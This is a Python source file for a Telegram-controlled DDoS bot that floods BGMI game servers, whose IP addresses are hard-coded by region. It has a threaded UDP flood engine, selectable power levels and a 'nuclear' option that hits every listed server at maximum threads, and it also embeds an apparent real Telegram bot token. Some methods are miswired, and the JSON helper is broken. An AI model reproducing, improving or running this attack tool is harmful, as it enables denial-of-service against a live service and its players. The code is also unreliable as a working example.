#!/usr/bin/env python3
"""
🔥 BGMI DDOS BOT v5.0 - @BADDOSxBOT EXACT COPY
1 File = Everything. No pip install needed!
GitHub: https://github.com/YOURNAME/BGMI-DDOS-BOT
"""

import socket
import threading
import random
import time
import os
import urllib.request
import http.client
import ssl
import json  # Added missing import
from datetime import datetime

# ================= TELEGRAM BOT (Pure HTTP - No pip) =================
class TelegramBot:
    def __init__(self, token):
        self.token = "8732926521:AAEWoCcOAMhRMFTX49SMz2M1FSRXFUXotGQ"
        self.base_url = f"https://api.telegram.org/bot{token}"
        
    def send_message(self, chat_id, text, reply_markup=None, parse_mode="Markdown"):
        data = {'chat_id': chat_id, 'text': text, 'parse_mode': parse_mode}
        if reply_markup:
            data['reply_markup'] = self.to_json(reply_markup)
        self._request('sendMessage', data)
        
    def edit_message_text(self, chat_id, message_id, text, reply_markup=None):
        data = {'chat_id': chat_id, 'message_id': message_id, 'text': text}
        if reply_markup:
            data['reply_markup'] = self.to_json(reply_markup)
        self._request('editMessageText', data)
        
    def answer_callback_query(self, callback_id, text):
        data = {'callback_query_id': callback_id, 'text': text}
        self._request('answerCallbackQuery', data)
        
    def _request(self, method, data):
        url = f"{self.base_url}/{method}"
        req = urllib.request.Request(url, data=self.to_json(data).encode())
        req.add_header('Content-Type', 'application/json')
        try:
            urllib.request.urlopen(req, timeout=10)
        except: 
            pass
        
    def to_json(self, obj):
        # Simple JSON serializer (fixed for nested dicts)
        if isinstance(obj, dict):
            items = []
            for k, v in obj.items():
                if isinstance(v, dict):
                    v_str = self.to_json(v)
                else:
                    v_str = str(v).replace('"', '\\"')
                items.append(f'"{k}":{v_str}')
            return '{' + ','.join(items) + '}'
        elif isinstance(obj, list):
            items = [self.to_json(item) for item in obj]
            return '[' + ','.join(items) + ']'
        else:
            return json.dumps(obj)
        
    def polling(self):
        offset = 0
        while True:
            try:
                url = f"{self.base_url}/getUpdates?offset={offset}&timeout=30"
                req = urllib.request.Request(url)
                resp = urllib.request.urlopen(req).read().decode()
                updates = json.loads(resp)['result']
                for update in updates:
                    offset = update['update_id'] + 1
                    self.handle_update(update)
            except: 
                time.sleep(1)
    
    def handle_update(self, update):
        if 'message' in update:
            self.handle_message(update['message'])
        elif 'callback_query' in update:
            self.handle_callback(update['callback_query'])

# ================= CONFIG =================
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # @BotFather
OWNER_ID = 123456789               # @userinfobot
bot = TelegramBot(BOT_TOKEN)

# BGMI Servers (@BADDOSxBOT exact)
BGMI_SERVERS = {
    "IN1": ["103.147.41.248", "103.147.41.249"], 
    "IN2": ["45.84.0.1", "45.84.0.2"],
    "SEA": ["118.107.244.1"],
    "ALL": ["103.147.41.248", "45.84.0.1"]
}

POWERS = {"1":1000, "2":5000, "3":15000, "4":50000, "MAX":100000}
attacks = {}

# ================= ATTACK ENGINE (Pure Python) =================
class DDoSAttack:
    def __init__(self, target, power="3"):
        self.target = target
        self.power = POWERS.get(power, 5000)
        self.running = False
        self.packets = 0
        
    def bgmi_freeze(self):
        payload = b"\xFF\xFD\x01" + os.urandom(1400)
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (self.target, random.choice([8000,443,80])))
                self.packets += 1
                sock.close()
            except: 
                pass
            time.sleep(0.001)
                
    def start(self):
        self.running = True
        for _ in range(self.power // 200):
            t = threading.Thread(target=self.bgmi_freeze)
            t.daemon = True
            t.start()

# ================= KEYBOARDS =================
def main_menu():
    return {
        "inline_keyboard": [
            [{"text": "🔥 ATTACK", "callback_data": "attack"}, 
             {"text": "📊 STATS", "callback_data": "stats"}],
            [{"text": "🏪 SERVERS", "callback_data": "servers"},
             {"text": "💀 NUCLEAR", "callback_data": "nuclear"}],
            [{"text": "🔙 INFO", "callback_data": "info"}]
        ]
    }

def power_menu():
    kb = [[{"text": f"⚡ POWER {p}", "callback_data": f"power_{p}"}] for p in ["1","2","3","4","MAX"]]
    kb.append([{"text": "🔙 BACK", "callback_data": "back"}])
    return {"inline_keyboard": kb}

def server_menu():
    kb = [[{"text": f"🌍 {r}", "callback_data": f"server_{r}"}] for r in BGMI_SERVERS]
    kb.append([{"text": "🔙 BACK", "callback_data": "back"}])
    return {"inline_keyboard": kb}

# ================= COMMANDS (@BADDOSxBOT 100% COPY) =================
def handle_message(message):
    uid = message['from']['id']
    if uid != OWNER_ID:
        bot.send_message(uid, "❌ **ACCESS DENIED**")
        return
        
    text = message.get('text', '').lower()
    cid = message['chat']['id']
    
    if text in ['/start', '/menu']:
        bot.send_message(cid, "🔥 **BGMI DDOS BOT v5.0**\n👑 **@BADDOSxBOT Clone**\n⚡ **Single File Power**", main_menu())
        
    elif text == '/attack':
        bot.send_message(cid, "⚡ **CHOOSE POWER:**", power_menu())
        
    elif text == '/servers':
        txt = "**🏪 BGMI SERVERS:**\n\n"
        for r, ips in BGMI_SERVERS.items():
            txt += f"`{r}:` {', '.join(ips)}\n"
        bot.send_message(cid, txt, server_menu())
        
    elif text == '/stats':
        active = len([a for a in attacks.values() if a.running])
        txt = f"📊 **STATS**\n🔥 Active: `{active}`\n⚡ Max: `{POWERS['MAX']}`"
        bot.send_message(cid, txt)

def handle_callback(callback):
    uid = callback['from']['id']
    if uid != OWNER_ID: 
        return
    
    cid = callback['message']['chat']['id']
    mid = callback['message']['message_id']
    data = callback['data']
    
    if data == "attack":
        bot.edit_message_text(cid, mid, "⚡ **POWER LEVEL:**", power_menu())
    elif data == "servers":
        bot.edit_message_text(cid, mid, "**🌍 SELECT REGION:**", server_menu())
    elif data == "stats":
        active = len([a for a in attacks.values() if a.running])
        bot.answer_callback_query(callback['id'], f"Active: {active}")
    elif data.startswith("power_"):
        power = data.split("_")[1]
        target = random.choice(BGMI_SERVERS["ALL"])
        launch_attack(target, power, cid)
    elif data.startswith("server_"):
        region = data.split("_")[1]
        target = random.choice(BGMI_SERVERS[region])
        launch_attack(target, "3", cid)
    elif data == "nuclear":
        bot.send_message(cid, "💀 **NUCLEAR STRIKE** - All BGMI servers!")
        for region in BGMI_SERVERS:
            for ip in BGMI_SERVERS[region]:
                launch_attack(ip, "MAX", cid, True)
    elif data == "back":
        bot.edit_message_text(cid, mid, "🔥 **MAIN MENU**", main_menu())
    elif data == "info":
        bot.send_message(cid, "👑 **@BADDOSxBOT Clone**\nSingle file - No deps!")

def launch_attack(target, power, chat_id, silent=False):
    attack = DDoSAttack(target, power)
    attacks[target] = attack
    attack.start()
    
    msg = f"🚀 **ATTACK LIVE!**\n🎯 `{target}`\n⚡ `{POWERS[power]}` Threads\n⏱️ 60s"
    if not silent:
        bot.send_message(chat_id, msg)
    
    threading.Timer(60.0, lambda: stop_attack(target, chat_id)).start()

def stop_attack(target, chat_id):
    if target in attacks:
        attacks[target].running = False
        del attacks[target]

# ================= MAIN =================
if __name__ == "__main__":
    print("🔥 BGMI DDOS BOT v5.0 - SINGLE FILE")
    print("👑 @BADDOSxBOT Exact Clone")
    print("⚡ No pip install - Pure Python")
    print("🎮 t.me/yourbot")
    bot.polling()
